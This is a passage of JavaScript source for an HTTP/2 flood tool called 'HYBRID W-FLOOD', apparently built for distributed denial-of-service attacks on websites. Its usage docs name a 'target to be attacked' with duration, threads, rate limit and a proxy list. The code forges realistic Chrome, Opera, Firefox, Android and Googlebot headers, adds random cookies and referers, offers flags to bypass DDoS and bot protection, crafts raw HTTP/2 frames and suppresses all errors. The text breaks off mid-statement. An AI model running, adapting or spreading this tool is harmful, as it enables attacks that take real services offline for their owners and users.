const fs = require('fs');
const cluster = require('cluster');
const url = require('url');
const net = require('net');
const tls = require('tls');
const crypto = require('crypto');
const HPACK = require('hpack');
const { Buffer } = require('buffer');
const colors = require('colors');

// === ERROR IGNORE SYSTEM ===
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        if (process.argv.includes('--debug')) console.log(e);
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        if (process.argv.includes('--debug')) console.log(e);
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        if (process.argv.includes('--debug')) console.log(e);
    })
    .on("SIGHUP", () => { return 1; })
    .on("SIGCHILD", () => { return 1; });

require("events").EventEmitter.defaultMaxListeners = 0;

// === DOCUMENTATION ===
const docss = `
All the parameters written below all work, so please pay attention. This method is a method that can be customized,

1. <GET/POST>: Determines the type of HTTP method to be used, whether GET or POST. Example: <GET> or <POST>.
2. <target>: Provides the URL or target to be attacked. Example: https://example.com.
3. <time>: Provides the duration or time in seconds to run the attack. Example: 60 (for a 60 second attack).
4. <threads>: Specifies the number of threads or concurrent connections to create. Example: 50.
5. <ratelimit>: Sets the rate limit for requests, if any. Example: 1000 (limit 1000 requests per second).
6. <proxy>: File Proxy.txt You USe On Attack The Website

OPTIONAL FLAGS:
--debug          : Show debug information
--bypass         : Enable HTTP-DDoS bypass mode
--googlebot      : Use Googlebot headers and user agents
--ios            : Use iOS headers and user agents  
--samsung        : Use Samsung headers and user agents
--tablet         : Use Tablet headers and user agents
--random         : Enable all random settings (paths, referers, cookies, etc)
--legit          : Enable legitimate headers
--referer        : Enable random referers
--cookies        : Enable random cookies
--secua          : Enable Sec-CH-UA headers
--bfm            : Enable Bot Fighting Mode bypass
--rapidreset     : Enable rapid reset protection
--http1          : Use HTTP/1.1 instead of HTTP/2
--post           : Use POST method with random data

Usage: node H2-ENYV.js GET https://example.com/ 60 10 100 proxy.txt --bypass --googlebot --random
`;

const docsIndex = process.argv.indexOf('--show');
if (docsIndex !== -1) {
    const docsvalue = process.argv[docsIndex + 1];
    if (docsvalue && docsvalue.includes('docs')) {
        console.clear();
        console.log(docss);
        process.exit(0);
    }
}

// === PARSING ARGUMENTS ===
const [method, target, time, threads, ratelimit, proxyFile] = process.argv.slice(2);
const debugMode = process.argv.includes('--debug');

if (!method || !target || !time || !threads || !ratelimit || !proxyFile) {
    console.clear();
    console.error(`\x1b[31mError: Missing required arguments!\x1b[0m`);
    console.error(`\x1b[90mUsage: node ${process.argv[1]} <METHOD> <URL> <TIME> <THREADS> <RATELIMIT> <PROXY_FILE> [OPTIONS]\x1b[0m`);
    console.error(`\x1b[90mTry: node ${process.argv[1]} --show docs\x1b[0m`);
    process.exit(1);
}

const parsedTarget = url.parse(target);
const isHttps = parsedTarget.protocol === 'https:';
const targetPort = parsedTarget.port || (isHttps ? 443 : 80);

if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(method.toUpperCase())) {
    console.error('\x1b[31mError: Request method must be GET, POST, HEAD, or OPTIONS\x1b[0m');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('\x1b[31mError: Protocol must be https:// or http://\x1b[0m');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('\x1b[31mError: Invalid time format (must be positive number)\x1b[0m');
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('\x1b[31mError: Threads must be between 1 and 256\x1b[0m');
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0) {
    console.error('\x1b[31mError: Rate limit must be positive number\x1b[0m');
    process.exit(1);
}

// === CONFIGURATION ===
const CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384';
const SIGALGS = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256';
const SECURE_OPTIONS = crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL;

// === HTTP/2 FRAME FUNCTIONS ===
const FRAME_TYPES = {
    0x0: 'DATA',
    0x1: 'HEADERS',
    0x2: 'PRIORITY',
    0x3: 'RST_STREAM',
    0x4: 'SETTINGS',
    0x5: 'PUSH_PROMISE',
    0x6: 'PING',
    0x7: 'GOAWAY',
    0x8: 'WINDOW_UPDATE',
    0x9: 'CONTINUATION'
};

const PREFACE = Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a', 'hex');

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomChar() {
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    return chars[Math.floor(Math.random() * chars.length)];
}

// === ARGS CONFIGURATION ===
const args = {
    method: process.argv.includes('--post') ? 'POST' : method.toUpperCase(),
    time: parseInt(time),
    threads: parseInt(threads),
    ratelimit: parseInt(ratelimit),
    proxyFile: proxyFile,
    target: target,
    parsedTarget: parsedTarget,

    // Options/flags
    randomPath: process.argv.includes('--random') || process.argv.includes('--bypass'),
    randomReferer: process.argv.includes('--random') || process.argv.includes('--referer') || process.argv.includes('--bypass'),
    cookies: process.argv.includes('--random') || process.argv.includes('--cookies'),
    googlebot: process.argv.includes('--googlebot'),
    ios: process.argv.includes('--ios'),
    samsung: process.argv.includes('--samsung'),
    tablet: process.argv.includes('--tablet'),
    secua: process.argv.includes('--random') || process.argv.includes('--secua') || process.argv.includes('--bypass'),
    bypass: process.argv.includes('--bypass'),
    bfm: process.argv.includes('--random') || process.argv.includes('--bfm'),
    legit: process.argv.includes('--random') || process.argv.includes('--legit') || process.argv.includes('--bypass'),
    rapidreset: process.argv.includes('--rapidreset'),
    httpVersion: process.argv.includes('--http1') ? 1 : 2,
    debug: debugMode,

    // Additional options from w-flood style
    uuid: '',
    userAgent: '',
    customHeader: '',
    customReferer: '',
    postData: '',
    random: process.argv.includes('--random'),
    xf: false
};

// === REALISTIC HEADER DATABASE (FROM W-FLOOD) ===
const googleBotUserAgents = [
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.97 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Googlebot/2.1 (+http://www.google.com/bot.html)'
];

const iOSUserAgents = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPod touch; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1'
];

const samsungUserAgents = [
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36'
];

const tabletUserAgents = [
    'Mozilla/5.0 (Linux; Android 10; SM-T860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Lenovo TB-8505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-T733) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36'
];

const referers = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://www.facebook.com/',
    'https://www.youtube.com/', 'https://www.amazon.com/', 'https://www.twitter.com/',
    'https://www.instagram.com/', 'https://www.reddit.com/', 'https://www.wikipedia.org/'
];

const randomPaths = [
    '/', '/index.html', '/about', '/contact', '/products', '/services', '/blog',
    '/faq', '/login', '/register', '/cart', '/checkout', '/search', '/news', '/events'
];

const secCHUAVariants = [
    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Opera";v="105", "Chromium";v="119", "Not?A_Brand";v="24"'
];

const fetch_site = ["same-origin", "same-site", "cross-site", "none"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker"];

const language_header = [
    'en-US,en;q=0.9',
    'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7',
    'zh-CN,zh;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8'
];

// === PROXY MANAGER ===
class ProxyManager {
    constructor(proxyList) {
        this.proxies = proxyList;
        this.cache = new Map();
        this.index = 0;
        this.failedProxies = new Set();
    }

    getProxy() {
        const availableProxies = this.proxies.filter(proxy => !this.failedProxies.has(proxy));
        if (availableProxies.length === 0) {
            this.failedProxies.clear();
            return this.proxies[Math.floor(Math.random() * this.proxies.length)];
        }
        return availableProxies[Math.floor(Math.random() * availableProxies.length)];
    }

    markFailed(proxy) {
        this.failedProxies.add(proxy);
        this.cache.delete(proxy);
    }

    markSuccess(proxy) {
        this.cache.set(proxy, Date.now());
    }
}

// === BYPASS CONFIGURATION ===
function getRandomTLSCiphersuite() {
    const tlsCiphersuites = [
        'TLS_AES_128_CCM_8_SHA256', 'TLS_AES_128_CCM_SHA256',
        'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_256_GCM_SHA384',
        'TLS_AES_128_GCM_SHA256',
    ];
    return tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];
}

function generateRandomCookies() {
    const cookieNames = ['session', 'user_id', 'visitor', 'auth', 'PHPSESSID', 'csrf_token', 'preferences'];
    const cookieValues = ['abc123', 'xyz789', 'user12345', 'true', 'false', crypto.randomBytes(8).toString('hex')];
    
    const numCookies = Math.floor(Math.random() * 3) + 1;
    let cookieStr = '';
    
    for(let i = 0; i < numCookies; i++) {
        const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
        const value = cookieValues[Math.floor(Math.random() * cookieValues.length)];
        cookieStr += `${name}=${value}; `;
    }
    
    return cookieStr.trim();
}

function generateBFMBypass() {
    const timestamp = Date.now();
    const randomValue = Math.random().toString(36).substring(2, 15);
    const token = crypto.createHash('sha256').update(`${timestamp}:${randomValue}`).digest('hex');
    
    return {
        '_bfm_token': token,
        '_bfm_timestamp': timestamp.toString(),
        '_bfm_nonce': randomValue
    };
}

function getRandomUserAgent(opt = {}) {
    if (opt.googlebot && Math.random() > 0.7) {
        return googleBotUserAgents[Math.floor(Math.random() * googleBotUserAgents.length)];
    }
    
    if (opt.ios && Math.random() > 0.7) {
        return iOSUserAgents[Math.floor(Math.random() * iOSUserAgents.length)];
    }
    
    if (opt.samsung && Math.random() > 0.7) {
        return samsungUserAgents[Math.floor(Math.random() * samsungUserAgents.length)];
    }
    
    if (opt.tablet && Math.random() > 0.7) {
        return tabletUserAgents[Math.floor(Math.random() * tabletUserAgents.length)];
    }
    
    // Windows user agents
    const osList = ["Windows NT 10.0", "Macintosh", "X11", "Linux"];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge'];
    
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const version = Math.floor(Math.random() * 50) + 90;
    
    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}/${version}.0.0.0 Safari/537.36`;
}

// === HEADER GENERATORS FOR CHROME, OPERA, FIREFOX ===
function generateChromeHeaders(parsedTarget, opt = {}) {
    const isAndroid = Math.random() < 0.5;
    const browserVersion = Math.floor(Math.random() * 21) + 124;
    const os = isAndroid ? 'Android' : 'Windows NT 10.0';
    const platform = isAndroid ? '"Android"' : '"Windows"';
    const mobile = isAndroid ? '?1' : '?0';

    let brandValue;
    if (browserVersion === 126) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`;
    } else if (browserVersion === 131) {
        brandValue = `"Chromium";v="${browserVersion}", "Not:A-Brand";v="24", "Google Chrome";v="${browserVersion}"`;
    } else {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`;
    }

    const userAgent = isAndroid ?
        `Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36` :
        `Mozilla/5.0 (${os}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;

    const path = opt.randomPath ? randomPaths[Math.floor(Math.random() * randomPaths.length)] : parsedTarget.path || '/';

    const headers = [
        [':method', opt.method || 'GET'],
        [':authority', parsedTarget.hostname],
        [':scheme', parsedTarget.protocol === 'https:' ? 'https' : 'http'],
        [':path', path],
        ['user-agent', userAgent],
        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
        ['accept-encoding', 'gzip, deflate, br'],
        ['accept-language', 'en-US,en;q=0.9'],
        ['sec-ch-ua', brandValue],
        ['sec-ch-ua-mobile', mobile],
        ['sec-ch-ua-platform', platform],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-user', '?1'],
        ['sec-fetch-dest', 'document'],
        ['upgrade-insecure-requests', '1']
    ];

    if (opt.randomReferer) headers.push(['referer', referers[Math.floor(Math.random() * referers.length)]]);
    if (opt.cookies) headers.push(['cookie', generateRandomCookies()]);

    return headers;
}

function generateOperaHeaders(parsedTarget, opt = {}) {
    const isAndroid = Math.random() < 0.5;
    const browserVersion = Math.floor(Math.random() * 21) + 124;
    const os = isAndroid ? 'Android' : 'Windows NT 10.0';
    const platform = isAndroid ? '"Android"' : '"Windows"';
    const mobile = isAndroid ? '?1' : '?0';

    const brandValue = `"Chromium";v="${browserVersion}", "Not:A-Brand";v="24", "Opera";v="${browserVersion}"`;

    const userAgent = isAndroid ?
        `Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36 OPR/${browserVersion}.0.0.0` :
        `Mozilla/5.0 (${os}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 OPR/${browserVersion}.0.0.0`;

    const path = opt.randomPath ? randomPaths[Math.floor(Math.random() * randomPaths.length)] : parsedTarget.path || '/';

    const headers = [
        [':method', opt.method || 'GET'],
        [':authority', parsedTarget.hostname],
        [':scheme', parsedTarget.protocol === 'https:' ? 'https' : 'http'],
        [':path', path],
        ['user-agent', userAgent],
        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
        ['accept-encoding', 'gzip, deflate, br'],
        ['accept-language', 'en-US,en;q=0.9'],
        ['sec-ch-ua', brandValue],
        ['sec-ch-ua-mobile', mobile],
        ['sec-ch-ua-platform', platform],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-user', '?1'],
        ['sec-fetch-dest', 'document'],
        ['upgrade-insecure-requests', '1']
    ];

    if (opt.randomReferer) headers.push(['referer', referers[Math.floor(Math.random() * referers.length)]]);
    if (opt.cookies) headers.push(['cookie', generateRandomCookies()]);

    return headers;
}

function generateFirefoxHeaders(parsedTarget, opt = {}) {
    const isAndroid = Math.random() < 0.5;
    const firefoxVersion = Math.floor(Math.random() * 10) + 120;
    const os = isAndroid ? 'Android' : 'Windows NT 10.0';

    const userAgent = isAndroid ?
        `Mozilla/5.0 (Android 10; Mobile; rv:${firefoxVersion}.0) Gecko/${firefoxVersion}.0 Firefox/${firefoxVersion}.0` :
        `Mozilla/5.0 (${os}; Win64; x64; rv:${firefoxVersion}.0) Gecko/${firefoxVersion}.0 Firefox/${firefoxVersion}.0`;

    const path = opt.randomPath ? randomPaths[Math.floor(Math.random() * randomPaths.length)] : parsedTarget.path || '/';

    const headers = [
        [':method', opt.method || 'GET'],
        [':authority', parsedTarget.hostname],
        [':scheme', parsedTarget.protocol === 'https:' ? 'https' : 'http'],
        [':path', path],
        ['user-agent', userAgent],
        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
        ['accept-encoding', 'gzip, deflate, br'],
        ['accept-language', 'en-US,en;q=0.9'],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-user', '?1'],
        ['sec-fetch-dest', 'document'],
        ['upgrade-insecure-requests', '1']
    ];

    if (opt.randomReferer) headers.push(['referer', referers[Math.floor(Math.random() * referers.length)]]);
    if (opt.cookies) headers.push(['cookie', generateRandomCookies()]);

    return headers;
}

// === ENHANCED HEADER GENERATOR ===
function generateEnhancedHeaders(parsedTarget, opt = {}) {
    const browserType = Math.floor(Math.random() * 3); // 0: Chrome, 1: Opera, 2: Firefox

    switch (browserType) {
        case 0:
            return generateChromeHeaders(parsedTarget, opt);
        case 1:
            return generateOperaHeaders(parsedTarget, opt);
        case 2:
            return generateFirefoxHeaders(parsedTarget, opt);
    }
}

// === FUNCTIONS FOR HEADERS (FROM JAWA1.JS) ===
function generateWindowsHeaders(browserVersion, wfwf) {
    let brandValue;
    if (browserVersion === 126) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 131) {
        brandValue = `"Chromium";v="${browserVersion}", "Not:A-Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 144) {
        brandValue = `"Google Chrome";v="${browserVersion}", "Not(A:Brand";v="8", "Chromium";v="${browserVersion}"`;
    } else {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;

    const headers = [
        [':method', args.method],
        [':authority', parsedTarget.hostname],
        [':scheme', isHttps ? 'https' : 'http'],
        [':path', args.randomPath ? getRandomPath() : parsedTarget.path],
        ['Referer', args.randomReferer ? getRandomReferer() : 'https://www.google.com/'],
        ['sec-ch-ua', brandValue],
        ['sec-ch-ua-mobile', '?0'],
        ['sec-ch-ua-platform', '"Windows"'],
        ['upgrade-insecure-requests', '1'],
        ['user-agent', userAgent],
        ['accept', acceptHeaderValue],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-user', '?1'],
        ['sec-fetch-dest', 'document'],
        ['accept-encoding', 'gzip, deflate, br, zstd'],
        ['accept-language', langValue],
        ['priority', 'u=0, i']
    ];

    // Header tambahan acak untuk Windows
    if (Math.random() < 0.3) headers.push([`x-client-session${getRandomChar()}`, `none${getRandomChar()}`]);
    if (Math.random() < 0.3) headers.push([`sec-ms-gec-version${getRandomChar()}`, `undefined${getRandomChar()}`]);
    if (Math.random() < 0.3) headers.push([`sec-fetch-users${getRandomChar()}`, `?0${getRandomChar()}`]);
    if (Math.random() < 0.3) headers.push([`x-request-data${getRandomChar()}`, `dynamic${getRandomChar()}`]);

    // Add cookies if enabled
    if (args.cookies) {
        headers.push(['cookie', generateRandomCookies()]);
    }

    return headers;
}

function generateAndroidHeaders(browserVersion, wfwf) {
    const androidVersions = ['10', '11', '12', '13', '14'];
    const androidModels = [
        'SM-G991B', 'SM-G996B', 'SM-G998B', 
        'Pixel 7', 'Pixel 8', 'Pixel 9',
        'Xiaomi 13', 'Xiaomi 14',
        'OnePlus 11', 'OnePlus 12',
        'Vivo X100', 'Vivo X200',
        'OPPO Find X5', 'OPPO Find X6',
        'Realme GT 5', 'Nothing Phone 2'
    ];
    
    const androidVersion = androidVersions[Math.floor(Math.random() * androidVersions.length)];
    const model = androidModels[Math.floor(Math.random() * androidModels.length)];
    
    let brandValue;
    if (browserVersion === 126) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 131) {
        brandValue = `"Chromium";v="${browserVersion}", "Not:A-Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    } else if (browserVersion === 144) {
        brandValue = `"Google Chrome";v="${browserVersion}", "Not(A:Brand";v="8", "Chromium";v="${browserVersion}"`;
    } else {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }

    const userAgent = `Mozilla/5.0 (Linux; Android ${androidVersion}; ${model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;

    const acceptHeaders = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    ];
    const acceptHeaderValue = acceptHeaders[Math.floor(Math.random() * acceptHeaders.length)];

    const androidLanguages = [
        'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'en-US,en;q=0.9',
        'ms-MY,ms;q=0.9,en;q=0.8',
        'th-TH,th;q=0.9,en;q=0.8',
        'vi-VN,vi;q=0.9,en;q=0.8',
        'zh-CN,zh;q=0.9,en;q=0.8',
        'ja-JP,ja;q=0.9,en;q=0.8',
        'ko-KR,ko;q=0.9,en;q=0.8'
    ];
    const langValue = androidLanguages[Math.floor(Math.random() * androidLanguages.length)];

    const androidEncodings = [
        'gzip, deflate, br',
        'gzip, deflate',
        'gzip'
    ];
    const acceptEncodingValue = androidEncodings[Math.floor(Math.random() * androidEncodings.length)];

    const headers = [
        [':method', args.method],
        [':authority', parsedTarget.hostname],
        [':scheme', isHttps ? 'https' : 'http'],
        [':path', args.randomPath ? getRandomPath() : parsedTarget.path],
        ['Referer', args.randomReferer ? getRandomReferer() : 'https://www.google.com/'],
        ['sec-ch-ua', brandValue],
        ['sec-ch-ua-mobile', '?1'],
        ['sec-ch-ua-platform', '"Android"'],
        ['upgrade-insecure-requests', '1'],
        ['user-agent', userAgent],
        ['accept', acceptHeaderValue],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-user', '?1'],
        ['sec-fetch-dest', 'document'],
        ['accept-encoding', acceptEncodingValue],
        ['accept-language', langValue],
        ['priority', 'u=0, i']
    ];

    if (Math.random() < 0.4) {
        headers.push(['x-requested-with', 'com.android.chrome']);
    }
    if (Math.random() < 0.3) {
        headers.push(['viewport-width', Math.floor(Math.random() * 500) + 320]);
    }

    // Header acak tambahan
    if (Math.random() < 0.3) headers.push([`x-client-session${getRandomChar()}`, `none${getRandomChar()}`]);
    if (Math.random() < 0.3) headers.push([`x-android-version${getRandomChar()}`, `android-${androidVersion}`]);

    // Add cookies if enabled
    if (args.cookies) {
        headers.push(['cookie', generateRandomCookies()]);
    }

    return headers;
}

// === HELPER FUNCTIONS ===
function getRandomPath() {
    const randomPaths = [
        '/', '/index.html', '/about', '/contact', '/products', '/services', '/blog',
        '/faq', '/login', '/register', '/cart', '/checkout', '/search', '/news', '/events'
    ];
    return randomPaths[Math.floor(Math.random() * randomPaths.length)];
}

function getRandomReferer() {
    const referers = [
        'https://www.google.com/', 'https://www.bing.com/', 'https://www.facebook.com/',
        'https://www.youtube.com/', 'https://www.amazon.com/', 'https://www.twitter.com/',
        'https://www.instagram.com/', 'https://www.reddit.com/', 'https://www.wikipedia.org/'
    ];
    return referers[Math.floor(Math.random() * referers.length)];
}

function generateRandomCookies() {
    const cookieNames = ['session', 'user_id', 'visitor', 'auth', 'PHPSESSID', 'csrf_token', 'preferences'];
    const cookieValues = ['abc123', 'xyz789', 'user12345', 'true', 'false', crypto.randomBytes(8).toString('hex')];
    
    const numCookies = Math.floor(Math.random() * 3) + 1;
    let cookieStr = '';
    
    for(let i = 0; i < numCookies; i++) {
        const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
        const value = cookieValues[Math.floor(Math.random() * cookieValues.length)];
        cookieStr += `${name}=${value}; `;
    }
    
    return cookieStr.trim();
}

// === MAIN EXECUTION ===
if (cluster.isMaster) {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(Boolean);
    const statusCounts = {};
    let totalPacketsSent = 0;

    console.log("\x1b[31m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\x1b[0m");
    console.log("\x1b[31m        HYBRID W-FLOOD\x1b[0m");
    console.log("\x1b[31m     Made with ❤️ by @Lexy_Tegyo\x1b[0m");
    
    console.log(`\x1b[90mTarget    :\x1b[0m \x1b[31m${args.target}\x1b[0m`);
    console.log(`\x1b[90mMethod    :\x1b[0m \x1b[31m${args.method}\x1b[0m`);
    console.log(`\x1b[90mDuration  :\x1b[0m \x1b[31m${args.time} seconds\x1b[0m`);
    console.log(`\x1b[90mThreads   :\x1b[0m \x1b[31m${args.threads}\x1b[0m`);
    console.log(`\x1b[90mRate Limit:\x1b[0m \x1b[31m${args.ratelimit}/s\x1b[0m`);
    console.log(`\x1b[90mProxies   :\x1b[0m \x1b[31m${proxies.length}\x1b[0m`);
    console.log(`\x1b[90mProtocol  :\x1b[0m \x1b[31m${args.httpVersion === 1 ? 'HTTP/1.1' : 'HTTP/2'}\x1b[0m`);
    
    // Show enabled features
    const activeFlags = Object.entries(args)
        .filter(([key, value]) => value && key !== 'method' && key !== 'ratelimit' && key !== 'debug' && 
                                 key !== 'httpVersion' && key !== 'time' && key !== 'threads' && 
